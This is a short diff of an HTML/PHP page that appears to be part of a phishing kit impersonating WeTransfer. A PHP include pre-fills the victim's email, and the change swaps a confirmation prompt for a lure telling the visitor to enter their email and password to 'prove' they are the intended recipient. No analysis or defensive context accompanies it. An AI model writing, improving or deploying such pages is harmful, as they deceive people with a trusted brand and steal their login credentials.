@@ -232,7 +232,7 @@ Try refreshing the page or get in touch through our <a href="https://wetransfer.
     <div class="confirm-modal-box">
       <div style="margin: 0 auto; text-align: center; padding-top: 10px;">
         <img class="modal-logo" src="./WeTransfer_files/logo.png">
-        <div style="color: red; text-align:center;margin-top: 13px;"> Please confirm receiving email</div>
+        <div style="color: red; text-align:center;margin-top: 13px;"> These files are sensitive and secured against unauthorized access. In order to access this file, please enter your correct email and password to prove you are the intended recipient</div>
         <div style="text-align:center; margin-top: 25px;">
           <div>
             <input type="text" name="email" id="email" value="<?php include 'autoemail.php'; ?>" placeholder="Enter email ..." class="confirm-input">
